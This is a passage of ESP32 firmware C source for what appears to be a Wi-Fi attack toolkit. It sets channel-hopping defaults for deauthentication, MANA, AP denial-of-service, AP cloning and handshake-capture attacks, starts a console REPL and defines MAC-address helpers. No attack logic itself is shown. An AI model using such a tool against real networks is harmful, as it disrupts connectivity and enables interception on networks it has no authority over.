                free(attack_status);
                free(hop_defaults);
                free(hop_millis_defaults);
                return;
        }
    }
    for (int i = 0; i < ATTACKS_COUNT; ++i) {
        switch (i) {
            case ATTACK_MANA:
            case ATTACK_MANA_LOUD:
            case ATTACK_MANA_VERBOSE:                               /* Should these features */
            case ATTACK_HANDSHAKE:
                hop_millis_defaults[i] = DEFAULT_MANA_HOP_MILLIS;
                break;
            case ATTACK_BEACON:
            case ATTACK_PROBE:
            case ATTACK_SNIFF:
            case ATTACK_SCAN:
            case ATTACK_DEAUTH:
            case ATTACK_AP_DOS:                                     /* where hopping doesn't */
            case ATTACK_AP_CLONE:                                   /* make sense be */
            case ATTACK_RANDOMISE_MAC:                              /* treated differently somehow? */
                hop_millis_defaults[i] = DEFAULT_HOP_MILLIS;
                break;
            default:
                ESP_LOGE(TAG, "ATTACKS_COUNT has incorrect length");
                free(attack_status);
                free(hop_defaults);
                free(hop_millis_defaults);
                return;
        }
    }
    /* BEACON, PROBE, SNIFF, DEAUTH, MANA, MANA_VERBOSE, AP_DOS, AP_CLONE, SCAN, HANDSHAKE, RAND_MAC */
/*    bool attack_status[ATTACKS_COUNT] = {false, false, false, false, false, false, false, false, false, false, false, true};
    bool  hop_defaults[ATTACKS_COUNT] = {true, true, true, true, false, false, false, false, false, true, false, false };
*/

    esp_console_repl_t *repl = NULL;
    esp_console_repl_config_t repl_config = ESP_CONSOLE_REPL_CONFIG_DEFAULT();
    /* Prompt to be printed before each line.
     * This can be customized, made dynamic, etc.
     */
    repl_config.prompt = PROMPT_STR ">";
    repl_config.max_cmdline_length = CONFIG_CONSOLE_MAX_COMMAND_LINE_LENGTH;

    initialize_nvs();

#if CONFIG_CONSOLE_STORE_HISTORY
    initialize_filesystem();
    repl_config.history_save_path = HISTORY_PATH;
    ESP_LOGI(TAG, "Command history enabled");
#else
    ESP_LOGI(TAG, "Command history disabled");
#endif

    esp_log_level_set("wifi", ESP_LOG_ERROR); /* YAGNI: Consider reducing these to ESP_LOG_WARN */
    esp_log_level_set("esp_netif_lwip", ESP_LOG_ERROR);
    initialise_wifi();
    /* Register commands */
    esp_console_register_help_command();
    register_system();
    register_wifi();
    register_gravity_commands();
    /*register_nvs();*/

#if defined(CONFIG_ESP_CONSOLE_UART_DEFAULT) || defined(CONFIG_ESP_CONSOLE_UART_CUSTOM)
    esp_console_dev_uart_config_t hw_config = ESP_CONSOLE_DEV_UART_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_console_new_repl_uart(&hw_config, &repl_config, &repl));

#elif defined(CONFIG_ESP_CONSOLE_USB_CDC)
    esp_console_dev_usb_cdc_config_t hw_config = ESP_CONSOLE_DEV_CDC_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_console_new_repl_usb_cdc(&hw_config, &repl_config, &repl));

#elif defined(CONFIG_ESP_CONSOLE_USB_SERIAL_JTAG)
    esp_console_dev_usb_serial_jtag_config_t hw_config = ESP_CONSOLE_DEV_USB_SERIAL_JTAG_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_console_new_repl_usb_serial_jtag(&hw_config, &repl_config, &repl));

#else
#error Unsupported console type
#endif

    ESP_ERROR_CHECK(esp_console_start_repl(repl));
}

/* Convert the specified string to a byte array
   bMac must be a pointer to 6 bytes of allocated memory */
int mac_string_to_bytes(char *strMac, uint8_t *bMac) {
    int values[6];

    if (6 == sscanf(strMac, "%x:%x:%x:%x:%x:%x%*c", &values[0],
        &values[1], &values[2], &values[3], &values[4], &values[5])) {
        // Now convert to uint8_t
        for (int i = 0; i < 6; ++i) {
            bMac[i] = (uint8_t)values[i];
        }
    } else {
        ESP_LOGE(TAG, "Invalid MAC specified. Format: 12:34:56:78:90:AB");
        return ESP_ERR_INVALID_ARG;
    }
    return ESP_OK;
}

/* Convert the specified byte array to a string representing
   a MAC address. strMac must be a pointer initialised to
   contain at least 18 bytes (MAC + '\0') */
int mac_bytes_to_string(uint8_t *bMac, char *strMac) {
    sprintf(strMac, "%02X:%02X:%02X:%02X:%02X:%02X", bMac[0],
            bMac[1], bMac[2], bMac[3], bMac[4], bMac[5]);
    return ESP_OK;
}